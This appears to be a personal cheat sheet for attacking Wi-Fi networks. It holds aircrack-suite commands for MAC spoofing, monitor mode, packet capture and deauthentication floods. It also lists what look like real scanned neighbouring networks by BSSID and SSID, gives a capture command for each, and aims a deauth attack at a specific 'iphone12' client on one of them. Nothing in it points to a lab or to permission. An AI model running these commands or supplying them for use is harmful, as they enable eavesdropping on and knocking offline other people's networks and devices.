# Wifi hacking

## MAC (Media Access Control) Address change

```sh
ifconfig wlan0 down
iwconfig wlan0 mode managed #be sure interface is in managed mode
# airmon-ng check kill #try if needed
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
```

## Monitor mode

```sh
airmon-ng check kill #kill all processes may realted with wireless interface
ifconfig wlan0 down
iwconfig wlan0 mode monitor #1 method or
airmon-ng start wlan0 #2 method
ifconfig wlan0 up
```

## Change the channel or name of interface

```sh
iwconfig wlan0 channel 3
iwconfig wlan0 essid 'myPi'
```

## Sniff packets

### Use specific band

- `a` - 5GHz
- `b,g` - 2.4GHz
- `n` - 2.4 and 5GHz
- `ac` - lower than 6GHz

```sh
airodump-ng --band abg wlan0
```

### Save captured data

```sh
airodump-ng --band a --channel 3 --write data_file wlan0
# and then open the file in wireshark
wireshark
```

## Deauth devices from network

### Deauth specific device

```sh
aireplay-ng --deauth 10000000 -a [wifi-mac-address] -c [client-mac-address] -wlan0
```

2C:C8:1B:F6:F8:9A  -59       49      562    0   3  130   WPA2 CCMP   PSK  Starlink-2G
34:2C:C4:18:F0:90  -67       10      118    0   1  130   WPA2 CCMP   PSK  UPC9912131
38:43:7D:8B:38:45  -82        9        2    0  11  130   WPA2 CCMP   PSK  UPC1774677
34:2C:C4:74:1D:72  -80        5        2    0   6  130   WPA2 CCMP   PSK  UPC5868970
88:CE:FA:EE:C3:13  -83        6       43    0  11  130   WPA2 CCMP   PSK  WLAN1-001891

airodump-ng --bssid 2C:C8:1B:F6:F8:9A --channel 3 --write /root/network-scan/scan-Starlink-2G wlan0
airodump-ng --bssid 34:2C:C4:18:F0:90 --channel 1 --write /root/network-scan/scan-UPC9912131 wlan0
airodump-ng --bssid 38:43:7D:8B:38:45 --channel 11 --write /root/network-scan/scan-UPC1774677 wlan0
airodump-ng --bssid 34:2C:C4:74:1D:72 --channel 6 --write /root/network-scan/scan-UPC5868970 wlan0
airodump-ng --bssid 88:CE:FA:EE:C3:13 --channel 11 --write /root/network-scan/scan-WLAN1-001891 wlan0
airodump-ng --bssid 24:A4:3C:A3:31:AC --channel 6 --write /root/network-scan/scan-unknown wlan0

iphone12 72:BA:C9:E6:56:DE

aireplay-ng --deauth 10000 -a 2C:C8:1B:F6:F8:9A -c 72:BA:C9:E6:56:DE wlan0

service NetworkManager start #To start Network Manager :-
or
systemctl start NetworkManager
service NetworkManager stop #To stop Network Manager:-
or
systemctl stop NetworkManager
service NetworkManager restart #To restart Network Manager:-
systemctl restart NetworkManager
